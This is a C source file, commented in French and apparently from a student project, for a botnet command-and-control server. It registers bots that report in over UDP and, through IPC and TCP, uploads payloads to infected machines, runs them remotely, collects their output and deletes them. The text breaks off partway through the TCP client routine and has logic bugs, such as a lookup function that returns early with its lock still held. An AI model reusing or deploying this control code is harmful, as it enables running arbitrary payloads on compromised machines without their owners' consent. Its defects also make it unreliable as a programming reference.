/* Command and Control Server : C&C

Communicate by Message Passing IPC with admin.c :
- Receive type 1 messages
- Answer by type 2 messages
- End the communication by sending a type 3 message

Communicate by Shared Memory IPC with the HTTP Server :
- 1rst shm : read data written by the HTTP server
- 2nd shm : write data to make the HTTP server print it on the website page

Communicate by TCP with the botnets.

PASSUPLOAD macro
By compiling with make passupload, the PASSUPLOAD macro is defined. When it is defined,
the dynamic library will be uploaded only in the C&C, it will not be uploaded
in any botnets via TCP.

Issues :
Sometimes dialogue between C&C and botnets never ends.
*/
#include "libfluxthread.h"
#include "libipc.h"
#include "libudp.h"
#include "libtcp.h"

#define CLE_MSG (key_t)1000
#define CLE_SEMAPHORE (key_t)1100
#define CLE_MEM_PARTAGEE (key_t)1200
#define CLE_SEMAPHORE_2 (key_t)1300
#define CLE_MEM_PARTAGEE_2 (key_t)1400
#define ID_C_and_C "C&C_0x00"
#define CHARGES_DIR_CC "./Charge_cc/"

/* Variables globales */
struct_tableau_ip_t tableau_ip;
struct_tableau_ip_t file_bot_connecte;
tab_nom_charge_t tableau_charge;
mutex_flux_t mutex_shm;
mutex_flux_t mutex_shm_2;
mutex_flux_t mutex_signal;
mutex_flux_t mutex_travail;
mutex_flux_t mutex_charge;
signal_flux_t cnd;
charge_t charge_to_send;
int travail[3]={-1,-1,-1};
char id_bot[7]="";
char duree_vie[4]="";

/* Prototypes */
void* ClientTCP(void* ip);
void handler(int SignalNum);
void* Envoie_ID_CC(void* arg);
void* Envoie_IP_BOT_CC(void* arg);
void* Envoie_liste_charges_CC(void* arg);
void Ajout_IP_BOT(struct_tableau_ip_t* pt_struct, char* mon_ip);
void* serveurUDP (void * s);
void* TASK_file_message_IPC(void* arg);
void* upload_charge_via_shm(void* arg);
void* TASK_memoire_partagee_SHM(void* arg);
void* ClientTCP(void* ip);
int est_une_charge(char* charge_name);
int est_connecte(char* ip);
int est_ip_bot(struct_tableau_ip_t tab, char* ip);
int traitement(unsigned char * message,int nboctets,char * hote);
int Suppression_charge_bot(FILE * dialogue, char* file_name);
int Execution_charge_bot(FILE * dialogue, char* file_name);
int Demande_resultat_execution(FILE * dialogue, int index);
int Installation_charge_utile (FILE * dialogue, charge_t ma_charge);


/* Intercepte CTRL + C : free les char* du tableau des noms de charge et les champs de la charge globale */
void handler(int SignalNum)
{
    if(SignalNum==SIGINT){
        printf("\nInterruption SIGINT\n");

		for (int i=0; i<tableau_charge.indice; i++){
			free(tableau_charge.tab_nom[i]);
		}
		printf("Free du tableau de nom de charge : ok\n");

        if(charge_to_send.name!=NULL) free(charge_to_send.name);
        if(charge_to_send.data!=NULL) free(charge_to_send.data);

        printf("Free de la charge gloable : ok\n");
        exit(0);
    }
}


/* envoie ID du C&C par fil de message */
void* Envoie_ID_CC(void* arg){
	printf("Envoie de mon id...\n");

	Msg_IPC_t message;
	message.type = 2;
	strcpy(message.texte, ID_C_and_C);
	envoie_msg_ipc(CLE_MSG, message);

	sleep(2);

	message.type = 3;
	strcpy(message.texte, "fin de la communication...");
	envoie_msg_ipc(CLE_MSG, message);

	return arg;
}


/* Envoie les IP des bots détectés par file de message IPC */
void* Envoie_IP_BOT_CC(void* arg){
	printf("Envoie des ips...\n");

	if(arg==NULL){
		printf("Arugment de Envoie_IP_BOT_CC = NULL on ne peut pas recup le teableau d'ip..\n");
		exit(0);
	}

	struct_tableau_ip_t my_struct = (*(struct_tableau_ip_t*)arg);

	P_semaphore_thread(&(my_struct.mutex_tab_ip));

	Msg_IPC_t message;
	message.type = 2;
	for(int i=0; i<my_struct.nb_bot; i++){
		strcpy(message.texte, my_struct.tab_IP[i]);
		printf("\n[c&c] j'envoie l'ip : %s",my_struct.tab_IP[i]);
		envoie_msg_ipc(CLE_MSG, message);
		sleep(1);
	}

	V_semaphore_thread(&(my_struct.mutex_tab_ip));

	message.type = 3;
	strcpy(message.texte, "fin de la communication...");
	envoie_msg_ipc(CLE_MSG, message);

	return arg;
}


/* Envoie par file de message IPC le nom des charges du C&C */
void* Envoie_liste_charges_CC(void* arg){

	printf("Envoie du nom de mes charges\n");
	Msg_IPC_t message;

	P_semaphore_thread(&(tableau_charge.mutex_nom_charge));

	message.type = 2;
	for(int i=0; i<tableau_charge.indice; i++){
		strcpy(message.texte, tableau_charge.tab_nom[i]);
		printf("\n[c&c] j'envoie le nom de charge : %s",tableau_charge.tab_nom[i]);fflush(stdout);
		envoie_msg_ipc(CLE_MSG, message);
		sleep(1);
	}

	V_semaphore_thread(&(tableau_charge.mutex_nom_charge));

	message.type = 3;
	strcpy(message.texte, "fin de la communication...");
	envoie_msg_ipc(CLE_MSG, message);

	return arg;
}


/* Ajoute une ip dans le tableau d'ip passé en paramètre */
void Ajout_IP_BOT(struct_tableau_ip_t* pt_struct, char* mon_ip){

	P_semaphore_thread(&(pt_struct->mutex_tab_ip));

	strcpy(pt_struct->tab_IP[pt_struct->nb_bot],mon_ip);

	if(pt_struct->nb_bot < NB_MAX_IP_BOT){
		pt_struct->nb_bot+=1;
	}
	else{
		printf("nombre d'ip maximum atteint : %d\n",NB_MAX_IP_BOT);
	}


	V_semaphore_thread(&(pt_struct->mutex_tab_ip));
}


/* retourne l'indice du nom de la charge dans le tableau de charge, -1 si non présent */
int est_une_charge(char* charge_name){
    P_semaphore_thread(&(tableau_charge.mutex_nom_charge));
	for(int i=0; i<tableau_charge.indice; i++){
		if(strncmp(tableau_charge.tab_nom[i],charge_name,strlen(charge_name))==0)
            V_semaphore_thread(&(tableau_charge.mutex_nom_charge));
			return i;
	}
    V_semaphore_thread(&(tableau_charge.mutex_nom_charge));
	return -1;
}


/* retourne l'indice de l'ip dans le tableau de bot connecte par TCP, -1 si non présent */
int est_connecte(char* ip){
    P_semaphore_thread(&(file_bot_connecte.mutex_tab_ip));
    for(int i=0; i<file_bot_connecte.nb_bot; i++){
        if(strcmp(file_bot_connecte.tab_IP[i],ip)==0){

            V_semaphore_thread(&(file_bot_connecte.mutex_tab_ip));
            return i;
        }
    }

    V_semaphore_thread(&(file_bot_connecte.mutex_tab_ip));
    return -1;
}


/* retourne l'indice de l'ip dans le tableau de bot, -1 si non présent */
int est_ip_bot(struct_tableau_ip_t tab, char* ip){
    P_semaphore_thread(&(tab.mutex_tab_ip));
    for(int i=0; i<tab.nb_bot; i++){
        if(strcmp(tab.tab_IP[i],ip)==0){

            V_semaphore_thread(&(tab.mutex_tab_ip));
            return i;
        }
    }

    V_semaphore_thread(&(tab.mutex_tab_ip));
    return -1;
}


/* fonction de traitement du serveur UDP : affiche l'ip des nouveaux bot, leur id, et leur durée de vie*/
int traitement(unsigned char * message,int nboctets,char * hote){
    char mon_ip_g[TAILLE_IP_BOT]="";

    for(int i=0;i<nboctets;i++){
        //printf("%02x ",message[i]);
    }

    for (int j=0;j<6;j++){
        id_bot[j]=message[j];
    }
    id_bot[6]='\0';

    for (int j=0;j<4;j++){
        duree_vie[j]=message[j+6];
    }
    duree_vie[4]='\0';

    for (unsigned int i=7;i<strlen(hote);i++){
        mon_ip_g[i-7]=hote[i];
    }

    if(est_ip_bot(tableau_ip, mon_ip_g)==-1){
        printf("j'ajoute: %s dans mon talbeau d'ip\n",mon_ip_g);
        printf("id : %s\n",id_bot);fflush(stdout);
        printf("duree de vie : %s\n",duree_vie);fflush(stdout);
        Ajout_IP_BOT(&tableau_ip,mon_ip_g);
    }
    return 0;
}


/* Serveur UDP
fonction situé dans Lib UDP. Elle permet de :
- Récuperer le message UDP envoyé par le client.
- A partir de l'adresse de la socket, recupère l'adresse IP du clientUDP
- lance la fonction traitement du message UDP
*/
void* serveurUDP (void * s){
  * (int *)s = initialisationSocketUDP("4242");
  boucleServeurUDP(* (int *)s,traitement);
  close(* (int *)s);
  synchro_thread();
  return NULL;
}


/* Serveur file de massage IPC, tourne en boucle à l'attente d'un message de type 1
un message de type 1 correspond à une requête, en fonction de cette requête on lance
le thread correspondant */
void* TASK_file_message_IPC(void* arg){
    char charge_name[TAILLE_MSG];
    char ip[TAILLE_MSG];

	Msg_IPC_t message_recue;

	Msg_IPC_t message_de_fin;
	message_de_fin.type=3;
	strcpy(message_de_fin.texte,"fin de la communication...");

    Msg_IPC_t message_reponse;
    message_reponse.type=2;

	while(1){
		if (recoit_msg_ipc(CLE_MSG, 1, &message_recue) == 0){ //requete en attente de la part de l'admin local
            //-----------------------------------------------------------------
            // 		                   Id du c&c
            //-----------------------------------------------------------------
            if(strncmp(message_recue.texte,"id",2)==0){ // envoie de l'id du c&c
				lancer_flux(Envoie_ID_CC,NULL,0);
				printf("\n[serveur IPC] Envoie_ID_CC\n");
            }
            //-----------------------------------------------------------------
            // 		       Lister les ip de tout les bot infectes
            //-----------------------------------------------------------------
            else if(strncmp(message_recue.texte,"ip",2)==0){ // envoie des ip des bots
				lancer_flux(Envoie_IP_BOT_CC, (void *) &tableau_ip, sizeof(tableau_ip));
				printf("\n[serveur IPC] Envoie_IP_BOT_CC\n");
        	}
            //-----------------------------------------------------------------
            // 		       Lister les charges à disposition du C&C
            //-----------------------------------------------------------------
			else if(strncmp(message_recue.texte,"liste_charge_cc",15)==0){ // Lister les charges a disposition du C&C
				lancer_flux(Envoie_liste_charges_CC,NULL,0);
				printf("\n[serveur IPC] Envoie_liste_charges_CC\n");
			}
            //-----------------------------------------------------------------
            // 	           	Demarrer/exécuter une charge sur un bot
            //-----------------------------------------------------------------
			else if(strncmp(message_recue.texte,"demarrer",8)==0){ // Demarrer une charge sur un bot
				printf("\n[serveur IPC] Demarrer charge\n");
                while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
                printf("[serveur IPC] Nom de la charge : %s\n",message_recue.texte);
                strcpy(charge_name,message_recue.texte);

                while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
                printf("[serveur IPC] IP du bot : %s\n",message_recue.texte);
                strcpy(ip,message_recue.texte);


                int indice_ip=est_ip_bot(tableau_ip, ip);
                if(indice_ip==-1){//ip invalide
                    printf("[serveur IPC] ip invalide\n");
                    strcpy(message_reponse.texte,"ip invalide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{//ip valide
                    printf("[serveur IPC] indice ip bot : %d\n",indice_ip);
                    strcpy(message_reponse.texte,"ip valide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }

                int indice_charge=est_une_charge(charge_name);
                if(indice_charge==-1){//charge inconnue par le C&C
                    printf("[serveur IPC] Charge inconnue de notre tableau de charge\n");
                    strcpy(message_reponse.texte,"charge inconnue par le C&C");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{//charge présente dans notre tableau de charge
                    printf("[serveur IPC] indice charge %d\n",indice_charge);
                    strcpy(message_reponse.texte,"charge reconnue par le C&C");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                if(indice_charge!=-1 && indice_ip!=-1){//ip valide et charge valdie
                    P_semaphore_thread(&mutex_travail);
                    travail[0]=indice_ip;
                    travail[1]=indice_charge;
                    travail[2]=3;//exécuter une charge
                    V_semaphore_thread(&mutex_travail);

                    if(est_connecte(ip)==-1){
                        printf("[serveur IPC] Nouvel connection au bot : %s\n",ip);
                        lancer_flux(ClientTCP,ip,strlen(ip)+1);
                    }
                    else{
                        printf("[serveur IPC] Bot deja connecte, nouvelle instruction\n");
                    }
                }
                sleep(1);
                envoie_msg_ipc(CLE_MSG,message_de_fin);// fin de la communication
			}
            //-----------------------------------------------------------------
            // 		       Effacer une charge presente sur un bot
            //-----------------------------------------------------------------
			else if(strncmp(message_recue.texte,"effacer",7)==0){ // Effacer une charge presente sur un bot
				printf("\n[serveur IPC] Effacer charge\n");
				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
				printf("[serveur IPC] Nom de la charge : %s\n",message_recue.texte);
                strcpy(charge_name,message_recue.texte);

				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
				printf("[serveur IPC] IP du bot : %s\n",message_recue.texte);
                strcpy(ip,message_recue.texte);


                int indice_ip=est_ip_bot(tableau_ip, ip);
                if(indice_ip==-1){//ip invalide
                    printf("[serveur IPC] ip invalide\n");
                    strcpy(message_reponse.texte,"ip invalide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{//ip valide
                    printf("[serveur IPC] indice ip bot : %d\n",indice_ip);
                    strcpy(message_reponse.texte,"ip valide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }

                int indice_charge=est_une_charge(charge_name);
                if(indice_charge==-1){//charge inconnue par le C&C
                    printf("[serveur IPC] Charge inconnue de notre tableau de charge\n");
                    strcpy(message_reponse.texte,"charge inconnue par le C&C");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{//charge présente dans notre tableau de charge
                    printf("[serveur IPC] indice charge %d\n",indice_charge);
                    strcpy(message_reponse.texte,"charge reconnue par le C&C");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                if(indice_charge!=-1 && indice_ip!=-1){//ip valide et charge valdie
                    P_semaphore_thread(&mutex_travail);
                    travail[0]=indice_ip;
                    travail[1]=indice_charge;
                    travail[2]=4;//effacer charge
                    V_semaphore_thread(&mutex_travail);

                    if(est_connecte(ip)==-1){
                        printf("[serveur IPC] Nouvel connection au bot : %s\n",ip);
                        lancer_flux(ClientTCP,ip,strlen(ip)+1);
                    }
                    else{
                        printf("[serveur IPC] Bot deja connecte, nouvelle instruction\n");
                    }
                }
                sleep(1);
				envoie_msg_ipc(CLE_MSG,message_de_fin);// fin de la communication
			}
            //-----------------------------------------------------------------
            // 	        Recevoir le resultat de l'exécution d'une charge
            //-----------------------------------------------------------------
			else if(strncmp(message_recue.texte,"resultat",8)==0){ // Demander le résultat d'une charge
				printf("\n[serveur IPC] Demander resultat charge\n");
				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
                int index = atoi(message_recue.texte);
				printf("[serveur IPC] Index du resultat de la charge : %d\n",index);
				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
				printf("[serveur IPC] IP du bot : %s\n",message_recue.texte);


                strcpy(ip,message_recue.texte);
                int indice_ip=est_ip_bot(tableau_ip, ip);
                if(indice_ip==-1){//ip invalide
                    printf("[serveur IPC] ip invalide\n");
                    strcpy(message_reponse.texte,"ip invalide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{
                    printf("[serveur IPC] indice ip bot : %d\n",indice_ip);
                    strcpy(message_reponse.texte,"ip valide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);

                    P_semaphore_thread(&mutex_travail);
                    travail[0]=indice_ip;
                    travail[1]=index;//l'indice de charge est ici l'index d'execution (pris en compte dans le client TCP)
                    travail[2]=5;//demande le resultat d'exeuction
                    V_semaphore_thread(&mutex_travail);

                    if(est_connecte(ip)==-1){
                        printf("[serveur IPC] Nouvel connection au bot : %s\n",ip);
                        lancer_flux(ClientTCP,ip,strlen(ip)+1);
                    }
                    else{
                        printf("[serveur IPC] Bot deja connecte, nouvelle instruction\n");
                    }
                }

                envoie_msg_ipc(CLE_MSG,message_de_fin);// FIN DE LA COMMUNICATION file message IPC
			}
            //-----------------------------------------------------------------
            // 	               	Affiche les stats du bot
            //-----------------------------------------------------------------
            else if(strncmp(message_recue.texte,"stat",2)==0){
				printf("\n[serveur IPC] Affiche les stats du bot\n");
				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
				printf("[serveur IPC] IP du bot : %s\n",message_recue.texte);
                strcpy(ip,message_recue.texte);


                int indice_ip=est_ip_bot(tableau_ip, ip);
                if(indice_ip==-1){//ip invalide
                    printf("[serveur IPC] ip invalide\n");
                    strcpy(message_reponse.texte,"ip invalide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{
                    printf("[serveur IPC] indice ip bot : %d\n",indice_ip);
                    strcpy(message_reponse.texte,"ip valide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);

                    P_semaphore_thread(&mutex_travail);
                    travail[0]=indice_ip;
                    travail[1]=-1;//on n'utilise pas de charge
                    travail[2]=1;//STAT
                    V_semaphore_thread(&mutex_travail);

                    if(est_connecte(ip)==-1){
                        printf("[serveur IPC] Nouvel connection au bot : %s\n",ip);
                        lancer_flux(ClientTCP,ip,strlen(ip)+1);
                    }
                    else{
                        printf("[serveur IPC] Bot deja connecte, nouvelle instruction\n");
                    }
                }

                envoie_msg_ipc(CLE_MSG,message_de_fin);// FIN DE LA COMMUNICATION file message IPC
            }
            //-----------------------------------------------------------------
            // 	    	Quitte la communication TCP avec le bot
            //-----------------------------------------------------------------
            else if(strncmp(message_recue.texte,"quit",2)==0){
				printf("\n[serveur IPC] Quitte la communication TCP avec le bot\n");
				while(recoit_msg_ipc(CLE_MSG, 1, &message_recue)!=0){}
				printf("[serveur IPC] IP du bot : %s\n",message_recue.texte);
                strcpy(ip,message_recue.texte);


                int indice_ip=est_ip_bot(tableau_ip, ip);
                if(indice_ip==-1){//ip invalide
                    printf("[serveur IPC] ip invalide\n");
                    strcpy(message_reponse.texte,"ip invalide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);
                }
                else{
                    printf("[serveur IPC] indice ip bot : %d\n",indice_ip);
                    strcpy(message_reponse.texte,"ip valide");
                    envoie_msg_ipc(CLE_MSG,message_reponse);

                    P_semaphore_thread(&mutex_travail);
                    travail[0]=indice_ip;
                    travail[1]=-1;//on n'utilise pas de charge
                    travail[2]=6;//QUIT
                    V_semaphore_thread(&mutex_travail);

                    if(est_connecte(ip)==-1){
                        printf("[serveur IPC] Nouvel connection au bot : %s\n",ip);
                        lancer_flux(ClientTCP,ip,strlen(ip)+1);
                    }
                    else{
                        printf("[serveur IPC] Bot deja connecte, nouvelle instruction\n");
                    }
                }

                envoie_msg_ipc(CLE_MSG,message_de_fin);// FIN DE LA COMMUNICATION file message IPC
            }
		}
	}
	return arg;
}


/* Recupere la charge par SHM, et l'enregistre dans 'c_and_c/Charge_cc/'
Ensuite lance l'opération d'upload par TCP */
void* upload_charge_via_shm(void* arg){
	int retour=0;
	int cpt=-1;
	struct sembuf tab_semaphores[NB_SEMAPHORE];
	unsigned char* msg_recu=malloc(TAILLE_MEM_PARTAGEE);
	charge_t ma_charge;
	ma_charge.data_size=TAILLE_MEM_PARTAGEE;
	int taille_donnee=TAILLE_MEM_PARTAGEE;
	char mon_ip[TAILLE_MEM_PARTAGEE];
	int taille_ip=0;


	/* protège (prend) ressource shm ENTRE THREAD */
	P_semaphore_thread(&mutex_shm);

    /* reception de la charge + ip dans la shm */
	while(cpt<6){
		sleep(1);

		retour=lit_mem_partagee(CLE_MEM_PARTAGEE, CLE_SEMAPHORE,tab_semaphores,msg_recu,taille_donnee);

		if(retour != -1) cpt++;

		if(cpt==0){
			taille_ip = (int) atoi((char*)msg_recu);
			printf("\n[upload] taille ip : %d",taille_ip-1);//on compte pas le '\0'
		}
		else if(cpt==1){ // ip sur laquelle envoyée (uploadée) la charge
			memcpy(mon_ip,msg_recu,taille_ip);
			printf("\n[upload] ip recue : %s",mon_ip);
		}
		else if(cpt==2){ //status de la charge - pas utilisé à ce jour
			ma_charge.status = (int) atoi((char*)msg_recu);
		}
		else if(cpt==3){// taille du nom de la charge
			ma_charge.name_size = (int) atoi((char*)msg_recu);
			printf("\n[upload] taille du nom de la charge : %d",ma_charge.name_size -1);//on compte pas le '\0'
		}
		else if(cpt==4){//envoie nom de la charge
			ma_charge.name=malloc(ma_charge.name_size);
			memcpy(ma_charge.name,msg_recu,ma_charge.name_size);
			printf("\n[upload] nom de la charge : %s",ma_charge.name);
		}
		else if(cpt==5){//taille de la charge
			ma_charge.data_size = (int) atoi((char*)msg_recu);
			printf("\n[upload] taille data charge : %d",ma_charge.data_size);
			taille_donnee=ma_charge.data_size;
			free(msg_recu);
			msg_recu=malloc(ma_charge.data_size);
		}
		else if(cpt==6){//charge
			ma_charge.data=malloc(ma_charge.data_size);
			memcpy(ma_charge.data,msg_recu,ma_charge.data_size);
			printf("\n[upload] charge recue\n");fflush(stdout);
			free(msg_recu);
		}
	}

	/* libère la ressource shm ENTRE THREAD */
	V_semaphore_thread(&mutex_shm);



    P_semaphore_thread(&mutex_charge);
    charge_to_send=ma_charge;
    V_semaphore_thread(&mutex_charge);


	/* écriture de la charge dans un fichier du C&C */
	char chemin[200]="";
	int compteur=0;
	strcpy(chemin,CHARGES_DIR_CC);
	strncat(chemin,ma_charge.name,ma_charge.name_size);

	FILE* fd = fopen(chemin,"wb");
	unsigned char* pt=ma_charge.data;

	while(compteur<ma_charge.data_size){
		fwrite(pt,1,1,fd);
		pt++;
		compteur++;
	}

	fclose(fd);


	/* Ajout du nom de la charge dans un tableau de nom de charge */
	if(est_une_charge(ma_charge.name)==-1){

        P_semaphore_thread(&(tableau_charge.mutex_nom_charge));

		int indice = tableau_charge.indice;

		if(indice <0 || indice > NB_MAX_CHARGES-1){
			printf("Erreur indice tableau du nom des charges : %d\n",indice);
			exit(0);
		}
		else{
			tableau_charge.tab_nom[indice]=NULL;
			tableau_charge.tab_nom[indice]=malloc(ma_charge.name_size);
			strncpy(tableau_charge.tab_nom[indice],ma_charge.name,ma_charge.name_size);
		}

		if(indice < NB_MAX_CHARGES-2){
			tableau_charge.indice++;
		}
		else{
			printf("Taille max du tableau de charge atteinte : %d/%d\n",indice,NB_MAX_CHARGES);
		}

        V_semaphore_thread(&(tableau_charge.mutex_nom_charge));
	}


	/* envoie signal au pthread_cond_wait */
	P_semaphore_thread(&mutex_signal);
	envoie_signal_thread(&cnd);
	V_semaphore_thread(&mutex_signal);


    #ifndef PASSUPLOAD

    /* upload sur le bot */
    int indice_ip=est_ip_bot(tableau_ip, mon_ip);
    if(indice_ip==-1){//ip invalide
        printf("[upload] ip invalide\n");
    }
    else{//ip valide
        printf("[upload] indice ip bot : %d\n",indice_ip);
    }

    int indice_charge=est_une_charge(ma_charge.name);
    if(indice_charge==-1){//charge inconnue par le C&C
        printf("[upload] Charge inconnue de notre tableau de charge\n");
    }
    else{//charge présente dans notre tableau de charge
        printf("[upload] indice charge %d\n",indice_charge);
    }
    if(indice_charge!=-1 && indice_ip!=-1){//ip valide et charge valdie
        P_semaphore_thread(&mutex_travail);
        travail[0]=indice_ip;
        travail[1]=indice_charge;
        travail[2]=2;//upload charge
        V_semaphore_thread(&mutex_travail);


        if(est_connecte(mon_ip)==-1){
            printf("[upload] Nouvel connection au bot : %s\n",mon_ip);
            lancer_flux(ClientTCP,mon_ip,strlen(mon_ip)+1);
        }
        else{
            printf("[upload] Bot deja connecte, nouvelle instruction\n");
        }
    }

    #endif


	return arg;
}


/* Attend un message écrit par le serveur http
Si une action est lancée (dans un thread T), le serveur attend jusqu'à reception d'un
signal envoyée par le thread T, afin d'éviter que le serveur et lke thread T accèdent
au même moment à la SHM */
void* TASK_memoire_partagee_SHM(void* arg){
	int retour=0;
	unsigned char msg_recu[TAILLE_MEM_PARTAGEE];
	struct sembuf tab_semaphores[NB_SEMAPHORE];

	P_semaphore_thread(&mutex_signal);

	while(1){
		P_semaphore_thread(&mutex_shm);

		retour=lit_mem_partagee(CLE_MEM_PARTAGEE, CLE_SEMAPHORE,tab_semaphores,msg_recu,TAILLE_MEM_PARTAGEE);

		V_semaphore_thread(&mutex_shm);

		if (retour != -1){

			if(strncmp((char*) msg_recu,"install",strlen("install"))==0){
				printf("\n\t[serveur SHM] upload de la charge");
				lancer_flux(upload_charge_via_shm,NULL,0);
				attend_signal_thread(&cnd, &mutex_signal);
			}
			else{
				printf("shm : %s\n",(char*) msg_recu);
			}
		}
		sleep(1);
	}
	V_semaphore_thread(&mutex_signal);
	return arg;
}


/* Dialogue pour supprimer une charge sur un bot, appelé par le Client TCP */
int Suppression_charge_bot(FILE * dialogue, char* file_name){
    printf("[suppression charge bot] je suis dans la fonction suppression\n");
    int cpt=0;
    char tampon[MAX_TAMPON]="delet?\n";

    while (1){
        if(cpt==0){
            fwrite(tampon,MAX_TAMPON,1,dialogue);
            if(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
                if(strncmp(tampon,"OKdelet\n",7)==0){
                    cpt++;
                }
            }
        }

        if(cpt==1){
            fprintf(dialogue,"%d\n",(int) strlen(file_name)+1);
            if(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
                cpt++;
            }
        }

        if(cpt==2)
        {
            strcpy(tampon,file_name);
            strcat(tampon,"\n");
            fwrite(tampon,MAX_TAMPON,1,dialogue);
            if(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
                if(strncmp(tampon,"NOKname\n",7)  == 0){
                    break;
                }
                else{
                    cpt ++;
                }
            }
        }

        if(cpt==3){
            strcpy(tampon,"bye\n");
            fwrite(tampon,MAX_TAMPON,1,dialogue);
            if(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
                break;
            }
        }
    }
    return 0;
}


/* Dialogue pour exécuter une charge sur un bot, appelé par le Client TCP */
int Execution_charge_bot(FILE * dialogue, char* file_name){
    printf("[execute charge] je suis dans la fonction execution\n");

    char tampon[MAX_TAMPON]="execute?\n";
    fprintf(dialogue,"%s\n","execute?");
    fflush(dialogue);
    int id;

    while (fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
        if(strncmp(tampon,"OKexecute\n",9)==0){
            printf("OKexecute?\n");
            fprintf(dialogue,"%d\n",(int) strlen(file_name)+1);
        }

        else if(strncmp(tampon,"OKname_size\n",11)==0){
            printf("OKname_size?\n");
            fprintf(dialogue,"%s\n",file_name);
        }

        else if(strncmp(tampon,"NOKname\n",7)==0){
            printf("NOKname?\n");
            break;
        }

        else if(strncmp(tampon,"OKname\n",6)==0){
            printf("OKname?\n");
        }

        else if(sscanf(tampon,"%d",&id) != EOF){
            printf("on recoit l'id ! : %d\n",id);
            fprintf(dialogue,"%s","OKid\n");
        }

        else if(strncmp(tampon,"bye\n",3)==0){
            printf("je recois bye\n");
            fprintf(dialogue,"%s\n","bye");
            break;
        }
    }
    return 0;
}


/* Dialogue pour demander le résultat d'exécution d'une charge, appelé par le Client TCP */
int Demande_resultat_execution(FILE * dialogue, int index){
    char tampon[MAX_TAMPON]="result?\n";
    fprintf(dialogue,"%s\n","result?");
    int taille_execution=0;
    int envoie_octet_par_octet = 0;

    while (fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
        if(strncmp(tampon,"OKresult\n",8)==0){
            printf("je recoit OKresult\n");
            fprintf(dialogue,"%d\n",index);
        }

        else if(strncmp(tampon,"NOKid\n",5)==0){
            printf("Je recoit NOKid\n");
            break;
        }

        else if(strncmp(tampon,"OKid\n",4)==0){
            printf("Je recoit OKid\n");
        }

        else if(sscanf(tampon,"%d",&taille_execution) != EOF){
            printf("j'ai recu la taille de l'execution\n");
            fprintf(dialogue,"%s","OKresult_size\n");
            envoie_octet_par_octet=1;
        }

        else if(envoie_octet_par_octet == 1){
            char * resultat_execution=malloc(taille_execution);
            char* pt2 = resultat_execution;
            int compteur = 0;

            while((fread(pt2,1, 1,dialogue) != 0) && (compteur < taille_execution -2)){
                compteur ++;
                pt2++; //on avance dans le tableau
            }
            fprintf(dialogue,"%s","bye\n");
            printf("%s\n",resultat_execution);fflush(stdout);
            free(resultat_execution);
        }
        else if(sscanf(tampon,"%d",&taille_execution) != EOF){
            printf("j'ai recu la taille de l'execution\n");
            fprintf(dialogue,"%s","OKresult_size\n");
            envoie_octet_par_octet=1;
        }

        else if(strncmp(tampon,"bye\n",3)==0){
            break;
        }
    }

    return 0;
}


/* Dialogue pour uploader une charge sur un bot, appelé par le Client TCP */
int Installation_charge_utile (FILE * dialogue, charge_t ma_charge){
    char tampon[MAX_TAMPON]="upload?\n";
    fprintf(dialogue,"%s\n","upload?");

    while(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
        if(strncmp(tampon,"OKupload\n",8)==0){
            printf("OKupload?\n");
            fprintf(dialogue,"%d\n",ma_charge.name_size);
        }

        else if(strncmp(tampon,"OKname_size\n",11)==0){
            printf("OKname_size?\n");
            fprintf(dialogue,"%s\n",ma_charge.name);
        }

        else if(strncmp(tampon,"OKname\n",6)==0){
            printf("OKname?\n");
            fprintf(dialogue,"%d\n",ma_charge.data_size);
        }

        else if(strncmp(tampon,"OKdata_size\n",11)==0){
            printf("OKdata_size?\n");
            unsigned char* pt1 = ma_charge.data;

            int comp = 0;
            //On envoie la data octet par octet
            while(comp<ma_charge.data_size){
                fwrite(pt1,1,1,dialogue);
                comp++;
                pt1++;
            }
        }

        else if(strncmp(tampon,"bye\n",3)==0){
            printf("bye\n");
            fprintf(dialogue,"%s\n","bye");
            break;
        }
    }
    return 0;
}


/* Client TCP : est appelé dans un thread si l'ip ne fait pas partie des ip
des bots connectés, on commence donc une nouvelle connection TCP
Une fois qu'il est appelé il boucle et lit dans la variable globale travail[3]
le travail qu'il doit faire */
void* ClientTCP(void* ip){
    int mon_id=est_ip_bot(tableau_ip, ip);
    printf("[Client TCP] nouvelle connection ip : %s\n",(char*)ip);

    Ajout_IP_BOT(&file_bot_connecte,ip);

    int socket = connexionServeur(ip,"4242");
    if(socket<0){ fprintf(stderr,"Erreur de connexion au serveur\n"); exit(EXIT_FAILURE); }
    FILE *dialogue=fdopen(socket,"a+");

    int indice_ip=-1, indice_charge=-1, num_fonction=-1;
    char nom_charge[512];

    while(1){
        P_semaphore_thread(&mutex_travail);
        indice_ip=travail[0];
        indice_charge=travail[1];
        num_fonction=travail[2];
        V_semaphore_thread(&mutex_travail);

        if(indice_ip==mon_id){
            if(indice_charge!=-1 && num_fonction!=5){//on a besoin du nom d'une charge
                strcpy(nom_charge,tableau_charge.tab_nom[indice_charge]);
                printf("[Client TCP] Je travaille sur : %s\n",nom_charge);
            }
            //-----------------------------------------------------------------
            // 		                      STAT
            //-----------------------------------------------------------------
            if(num_fonction==1){// STAT
